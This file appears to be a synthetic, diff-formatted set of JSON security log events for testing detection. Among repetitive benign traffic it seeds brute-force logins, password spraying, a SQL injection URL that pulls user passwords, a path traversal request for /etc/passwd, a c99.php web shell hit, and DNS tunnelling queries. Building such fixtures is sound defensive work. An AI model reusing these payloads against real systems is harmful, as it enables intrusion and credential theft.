+{"timestamp": "2026-10-04T09:05:00+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:05:00+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:05:00+00:00", "log_type": "authentication", "src_ip": "45.9.9.9", "user": "carol", "status": "failure", "geo_country": "RU"}
+{"timestamp": "2026-10-04T09:05:05+00:00", "log_type": "authentication", "src_ip": "45.9.9.9", "user": "carol", "status": "failure", "geo_country": "RU"}
+{"timestamp": "2026-10-04T09:05:10+00:00", "log_type": "firewall", "src_ip": "10.0.1.14", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:05:10+00:00", "log_type": "dns", "src_ip": "10.0.1.13", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:05:10+00:00", "log_type": "web_server", "src_ip": "192.168.5.6", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:05:10+00:00", "log_type": "authentication", "src_ip": "45.9.9.9", "user": "carol", "status": "failure", "geo_country": "RU"}
+{"timestamp": "2026-10-04T09:05:15+00:00", "log_type": "authentication", "src_ip": "45.9.9.9", "user": "carol", "status": "failure", "geo_country": "RU"}
+{"timestamp": "2026-10-04T09:05:20+00:00", "log_type": "firewall", "src_ip": "10.0.1.46", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:05:20+00:00", "log_type": "dns", "src_ip": "10.0.1.38", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:05:20+00:00", "log_type": "web_server", "src_ip": "192.168.5.6", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:05:20+00:00", "log_type": "authentication", "src_ip": "45.9.9.9", "user": "carol", "status": "failure", "geo_country": "RU"}
+{"timestamp": "2026-10-04T09:05:25+00:00", "log_type": "authentication", "src_ip": "45.9.9.9", "user": "carol", "status": "failure", "geo_country": "RU"}
+{"timestamp": "2026-10-04T09:05:30+00:00", "log_type": "firewall", "src_ip": "10.0.1.34", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:05:30+00:00", "log_type": "dns", "src_ip": "10.0.1.32", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:05:30+00:00", "log_type": "web_server", "src_ip": "192.168.5.2", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:05:35+00:00", "log_type": "authentication", "src_ip": "45.9.9.9", "user": "carol", "status": "success", "geo_country": "RU"}
+{"timestamp": "2026-10-04T09:05:40+00:00", "log_type": "firewall", "src_ip": "10.0.1.39", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:05:40+00:00", "log_type": "dns", "src_ip": "10.0.1.32", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:05:40+00:00", "log_type": "web_server", "src_ip": "192.168.5.4", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:05:50+00:00", "log_type": "firewall", "src_ip": "10.0.1.49", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:05:50+00:00", "log_type": "dns", "src_ip": "10.0.1.17", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:05:50+00:00", "log_type": "web_server", "src_ip": "192.168.5.9", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:05:50+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:05:50+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:05:50+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:05:50+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:05:50+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:05:50+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:05:50+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
+{"timestamp": "2026-10-04T09:05:50+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:05:50+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:06:00+00:00", "log_type": "firewall", "src_ip": "10.0.1.13", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:06:00+00:00", "log_type": "dns", "src_ip": "10.0.1.23", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:06:00+00:00", "log_type": "web_server", "src_ip": "192.168.5.6", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:06:10+00:00", "log_type": "firewall", "src_ip": "10.0.1.18", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:06:10+00:00", "log_type": "dns", "src_ip": "10.0.1.25", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:06:10+00:00", "log_type": "web_server", "src_ip": "192.168.5.8", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:06:20+00:00", "log_type": "firewall", "src_ip": "10.0.1.35", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:06:20+00:00", "log_type": "dns", "src_ip": "10.0.1.41", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:06:20+00:00", "log_type": "web_server", "src_ip": "192.168.5.3", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:06:30+00:00", "log_type": "firewall", "src_ip": "10.0.1.20", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:06:30+00:00", "log_type": "dns", "src_ip": "10.0.1.38", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:06:30+00:00", "log_type": "web_server", "src_ip": "192.168.5.8", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:06:40+00:00", "log_type": "firewall", "src_ip": "10.0.1.45", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:06:40+00:00", "log_type": "dns", "src_ip": "10.0.1.27", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:06:40+00:00", "log_type": "web_server", "src_ip": "192.168.5.4", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:06:40+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:06:40+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:06:40+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:06:40+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:06:40+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:06:40+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:06:40+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
+{"timestamp": "2026-10-04T09:06:40+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:06:40+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:06:40+00:00", "log_type": "authentication", "src_ip": "91.20.20.20", "user": "a", "status": "failure", "geo_country": "NL"}
+{"timestamp": "2026-10-04T09:06:44+00:00", "log_type": "authentication", "src_ip": "91.20.20.20", "user": "b", "status": "failure", "geo_country": "NL"}
+{"timestamp": "2026-10-04T09:06:48+00:00", "log_type": "authentication", "src_ip": "91.20.20.20", "user": "c", "status": "failure", "geo_country": "NL"}
+{"timestamp": "2026-10-04T09:06:50+00:00", "log_type": "firewall", "src_ip": "10.0.1.37", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:06:50+00:00", "log_type": "dns", "src_ip": "10.0.1.45", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:06:50+00:00", "log_type": "web_server", "src_ip": "192.168.5.6", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:06:52+00:00", "log_type": "authentication", "src_ip": "91.20.20.20", "user": "d", "status": "failure", "geo_country": "NL"}
+{"timestamp": "2026-10-04T09:06:56+00:00", "log_type": "authentication", "src_ip": "91.20.20.20", "user": "e", "status": "failure", "geo_country": "NL"}
+{"timestamp": "2026-10-04T09:07:00+00:00", "log_type": "firewall", "src_ip": "10.0.1.36", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:07:00+00:00", "log_type": "dns", "src_ip": "10.0.1.32", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:07:00+00:00", "log_type": "web_server", "src_ip": "192.168.5.8", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:07:00+00:00", "log_type": "authentication", "src_ip": "91.20.20.20", "user": "f", "status": "failure", "geo_country": "NL"}
+{"timestamp": "2026-10-04T09:07:04+00:00", "log_type": "authentication", "src_ip": "91.20.20.20", "user": "g", "status": "failure", "geo_country": "NL"}
+{"timestamp": "2026-10-04T09:07:08+00:00", "log_type": "authentication", "src_ip": "91.20.20.20", "user": "h", "status": "failure", "geo_country": "NL"}
+{"timestamp": "2026-10-04T09:07:10+00:00", "log_type": "firewall", "src_ip": "10.0.1.24", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:07:10+00:00", "log_type": "dns", "src_ip": "10.0.1.19", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:07:10+00:00", "log_type": "web_server", "src_ip": "192.168.5.3", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:07:12+00:00", "log_type": "authentication", "src_ip": "91.20.20.20", "user": "i", "status": "failure", "geo_country": "NL"}
+{"timestamp": "2026-10-04T09:07:16+00:00", "log_type": "authentication", "src_ip": "91.20.20.20", "user": "j", "status": "failure", "geo_country": "NL"}
+{"timestamp": "2026-10-04T09:07:20+00:00", "log_type": "firewall", "src_ip": "10.0.1.21", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:07:20+00:00", "log_type": "dns", "src_ip": "10.0.1.19", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:07:20+00:00", "log_type": "web_server", "src_ip": "192.168.5.5", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:07:20+00:00", "log_type": "authentication", "src_ip": "91.20.20.20", "user": "k", "status": "failure", "geo_country": "NL"}
+{"timestamp": "2026-10-04T09:07:30+00:00", "log_type": "firewall", "src_ip": "10.0.1.24", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:07:30+00:00", "log_type": "dns", "src_ip": "10.0.1.10", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:07:30+00:00", "log_type": "web_server", "src_ip": "192.168.5.9", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:07:30+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:07:30+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:07:30+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:07:30+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:07:30+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:07:30+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:07:30+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
+{"timestamp": "2026-10-04T09:07:30+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:07:30+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:07:40+00:00", "log_type": "firewall", "src_ip": "10.0.1.47", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:07:40+00:00", "log_type": "dns", "src_ip": "10.0.1.21", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:07:40+00:00", "log_type": "web_server", "src_ip": "192.168.5.6", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:07:50+00:00", "log_type": "firewall", "src_ip": "10.0.1.28", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:07:50+00:00", "log_type": "dns", "src_ip": "10.0.1.10", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:07:50+00:00", "log_type": "web_server", "src_ip": "192.168.5.4", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:08:00+00:00", "log_type": "firewall", "src_ip": "10.0.1.36", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:08:00+00:00", "log_type": "dns", "src_ip": "10.0.1.44", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:08:00+00:00", "log_type": "web_server", "src_ip": "192.168.5.7", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:08:10+00:00", "log_type": "firewall", "src_ip": "10.0.1.49", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:08:10+00:00", "log_type": "dns", "src_ip": "10.0.1.46", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:08:10+00:00", "log_type": "web_server", "src_ip": "192.168.5.7", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:08:20+00:00", "log_type": "firewall", "src_ip": "10.0.1.18", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:08:20+00:00", "log_type": "dns", "src_ip": "10.0.1.42", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:08:20+00:00", "log_type": "web_server", "src_ip": "192.168.5.2", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:08:20+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:08:20+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:08:20+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:08:20+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:08:20+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:08:20+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:08:20+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
+{"timestamp": "2026-10-04T09:08:20+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:08:20+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:08:20+00:00", "log_type": "web_server", "src_ip": "185.1.1.1", "url": "/items?id=1' UNION SELECT user,pass FROM users--", "status_code": 500, "user_agent": "sqlmap/1.7"}
+{"timestamp": "2026-10-04T09:08:30+00:00", "log_type": "firewall", "src_ip": "10.0.1.39", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:08:30+00:00", "log_type": "dns", "src_ip": "10.0.1.45", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:08:30+00:00", "log_type": "web_server", "src_ip": "192.168.5.8", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:08:30+00:00", "log_type": "web_server", "src_ip": "185.1.1.1", "url": "/../../etc/passwd", "status_code": 404, "user_agent": "curl/8"}
+{"timestamp": "2026-10-04T09:08:40+00:00", "log_type": "firewall", "src_ip": "10.0.1.35", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:08:40+00:00", "log_type": "dns", "src_ip": "10.0.1.35", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:08:40+00:00", "log_type": "web_server", "src_ip": "192.168.5.8", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:08:40+00:00", "log_type": "web_server", "src_ip": "185.1.1.2", "url": "/uploads/c99.php", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:08:50+00:00", "log_type": "firewall", "src_ip": "10.0.1.16", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:08:50+00:00", "log_type": "dns", "src_ip": "10.0.1.40", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:08:50+00:00", "log_type": "web_server", "src_ip": "192.168.5.8", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:09:00+00:00", "log_type": "firewall", "src_ip": "10.0.1.13", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:09:00+00:00", "log_type": "dns", "src_ip": "10.0.1.22", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:09:00+00:00", "log_type": "web_server", "src_ip": "192.168.5.3", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:09:10+00:00", "log_type": "firewall", "src_ip": "10.0.1.23", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:09:10+00:00", "log_type": "dns", "src_ip": "10.0.1.38", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:09:10+00:00", "log_type": "web_server", "src_ip": "192.168.5.4", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:09:10+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:09:10+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:09:10+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:09:10+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:09:10+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:09:10+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:09:10+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
+{"timestamp": "2026-10-04T09:09:10+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:09:10+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:09:20+00:00", "log_type": "firewall", "src_ip": "10.0.1.17", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:09:20+00:00", "log_type": "dns", "src_ip": "10.0.1.31", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:09:20+00:00", "log_type": "web_server", "src_ip": "192.168.5.2", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:09:30+00:00", "log_type": "firewall", "src_ip": "10.0.1.16", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:09:30+00:00", "log_type": "dns", "src_ip": "10.0.1.10", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:09:30+00:00", "log_type": "web_server", "src_ip": "192.168.5.4", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:09:40+00:00", "log_type": "firewall", "src_ip": "10.0.1.44", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:09:40+00:00", "log_type": "dns", "src_ip": "10.0.1.16", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:09:40+00:00", "log_type": "web_server", "src_ip": "192.168.5.7", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:09:50+00:00", "log_type": "firewall", "src_ip": "10.0.1.49", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:09:50+00:00", "log_type": "dns", "src_ip": "10.0.1.11", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:09:50+00:00", "log_type": "web_server", "src_ip": "192.168.5.3", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:10:00+00:00", "log_type": "firewall", "src_ip": "10.0.1.23", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:10:00+00:00", "log_type": "dns", "src_ip": "10.0.1.49", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:10:00+00:00", "log_type": "web_server", "src_ip": "192.168.5.8", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:10:00+00:00", "log_type": "authentication", "src_ip": "10.0.1.20", "user": "alice", "status": "success", "geo_country": "IN"}
+{"timestamp": "2026-10-04T09:10:00+00:00", "log_type": "dhcp", "action": "offer", "server_ip": "10.0.0.1", "mac": "aa:bb:cc:00:00:01"}
+{"timestamp": "2026-10-04T09:10:00+00:00", "log_type": "application", "app": "billing", "level": "info", "event": "login", "user": "alice", "user_role": "admin", "src_ip": "10.0.1.20"}
+{"timestamp": "2026-10-04T09:10:00+00:00", "log_type": "network_flow", "src_ip": "10.0.1.21", "dst_ip": "52.1.1.1", "dst_port": 443, "bytes_out": 20000, "direction": "outbound"}
+{"timestamp": "2026-10-04T09:10:00+00:00", "log_type": "windows", "host": "WS-01", "user": "alice", "event_id": 4624}
+{"timestamp": "2026-10-04T09:10:00+00:00", "log_type": "linux", "host": "web01", "src_ip": "10.0.1.20", "user": "alice", "message": "Accepted publickey for alice"}
+{"timestamp": "2026-10-04T09:10:00+00:00", "log_type": "ids_ips", "src_ip": "10.0.1.5", "signature": "INFO Policy", "priority": 3}
+{"timestamp": "2026-10-04T09:10:00+00:00", "log_type": "file_audit", "host": "WS-01", "user": "alice", "action": "read", "file_path": "C:/docs/a.docx"}
+{"timestamp": "2026-10-04T09:10:00+00:00", "log_type": "endpoint_edr", "host": "WS-01", "user": "alice", "process_name": "chrome.exe", "parent_process": "explorer.exe", "command_line": "chrome.exe"}
+{"timestamp": "2026-10-04T09:10:00+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x0.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:01+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x1.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:02+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x2.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:03+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x3.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:04+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x4.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:05+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x5.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:06+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x6.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:07+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x7.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:08+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x8.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:09+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x9.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:10+00:00", "log_type": "firewall", "src_ip": "10.0.1.19", "dst_ip": "8.8.8.8", "dst_port": 443, "action": "allow"}
+{"timestamp": "2026-10-04T09:10:10+00:00", "log_type": "dns", "src_ip": "10.0.1.50", "query": "www.google.com", "record_type": "A"}
+{"timestamp": "2026-10-04T09:10:10+00:00", "log_type": "web_server", "src_ip": "192.168.5.6", "url": "/index.html", "status_code": 200, "user_agent": "Mozilla/5.0"}
+{"timestamp": "2026-10-04T09:10:10+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x10.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:11+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x11.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:12+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x12.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:13+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x13.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:14+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x14.tunnel.example", "record_type": "TXT"}
+{"timestamp": "2026-10-04T09:10:15+00:00", "log_type": "dns", "src_ip": "10.0.1.77", "query": "x15.tunnel.example", "record_type": "TXT"}
